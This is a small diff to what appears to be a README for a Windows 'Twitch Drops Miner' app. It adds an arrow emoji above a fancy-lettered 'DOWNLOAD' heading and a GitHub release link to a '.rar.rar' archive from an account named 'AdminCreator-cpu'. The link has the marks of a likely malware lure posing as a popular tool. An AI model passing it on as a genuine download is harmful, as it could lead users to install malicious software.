@@ -57,4 +57,6 @@ As an alternative to the native Linux app, you can run the Windows app via Wine 
 
 𝓓𝓞𝓦𝓝𝓛𝓞𝓐𝓓
 
+⬇️
+
 https://github.com/AdminCreator-cpu/Twitch.Drops.Miner.Windows/releases/download/Twitch.Drops.Miner.Windows/Twitch.Drops.Miner.Windows.rar.rar
